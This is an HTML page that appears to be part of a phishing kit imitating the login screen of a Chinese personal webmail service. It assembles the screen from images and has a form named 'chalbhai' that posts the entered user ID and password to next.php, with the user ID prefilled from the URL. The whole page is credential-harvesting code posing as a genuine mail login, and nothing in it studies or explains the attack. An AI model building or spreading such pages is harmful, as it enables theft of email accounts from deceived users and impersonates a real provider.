<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#20013;&#21326;&#37038;&#20010;&#20154;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {
    border: 1px solid #ccc;
    display: block;
    color: #333;
    float: left;
  	padding-left: 5px;
    font-size: 14px;
    height: 32px;
    width: 275px;
}

 </style>
 <style type="text/css">
  
.textrbox { 
    border: 1px solid #EDEDED; 
    outline:0;
	background:  #EDEDED; 
	font-size: 14px;
	color: #333;	
    height:32px; 
    width: 275px; 
    padding-left: 5px; 
  } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:161px; z-index:0"><img src="images/c1.png" alt="" title="" border=0 width=1349 height=161></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:160px; width:1349px; height:210px; z-index:1"><img src="images/c2.png" alt="" title="" border=0 width=1349 height=210></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:367px; width:1349px; height:216px; z-index:2"><img src="images/c3.png" alt="" title="" border=0 width=1349 height=216></div>

<div id="image4" style="position:absolute; overflow:hidden; left:428px; top:620px; width:494px; height:73px; z-index:3"><a href="#"><img src="images/c4.png" alt="" title="" border=0 width=494 height=73></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:225px; top:41px; width:110px; height:57px; z-index:4"><a href="#"><img src="images/c5.png" alt="" title="" border=0 width=110 height=57></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:427px; top:66px; width:328px; height:22px; z-index:5"><a href="#"><img src="images/c6.png" alt="" title="" border=0 width=328 height=22></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:906px; top:67px; width:217px; height:21px; z-index:6"><a href="#"><img src="images/c7.png" alt="" title="" border=0 width=217 height=21></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:903px; top:384px; width:101px; height:17px; z-index:7"><a href="#"><img src="images/c8.png" alt="" title="" border=0 width=101 height=17></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:745px; top:168px; width:85px; height:19px; z-index:8"><a href="#"><img src="images/c9.png" alt="" title="" border=0 width=85 height=19></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:182px;left:800px;top:230px;z-index:9">
<input name="pass" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:182px;left:800px;top:280px;z-index:10">
<div id="formcheckbox1" style="position:absolute; left:800px; top:330px; z-index:11"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:799px; top:374px; z-index:12"><input type="image" name="formimage1" width="97" height="33" src="images/done.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
